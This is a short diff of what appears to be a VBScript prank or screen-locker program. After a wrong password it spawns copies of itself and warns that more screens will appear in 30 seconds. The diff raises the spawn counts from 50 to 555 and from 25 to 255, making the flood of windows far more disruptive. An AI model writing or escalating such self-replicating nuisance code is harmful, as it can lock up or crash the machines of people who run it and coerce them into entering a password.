@@ -49,9 +49,9 @@ Do
             MsgBox "Incorrect password! Attempts left: " & (maxAttempts - attempts), vbCritical + vbSystemModal, "Error"
         End If
 
-        SpawnCopies 50
+        SpawnCopies 555
         MsgBox "Warning: You have 30 seconds before more screens appear.", vbExclamation + vbSystemModal, "Watch out"
         WScript.Sleep 30 * 1000
-        SpawnCopies 25
+        SpawnCopies 255
     End If
 Loop
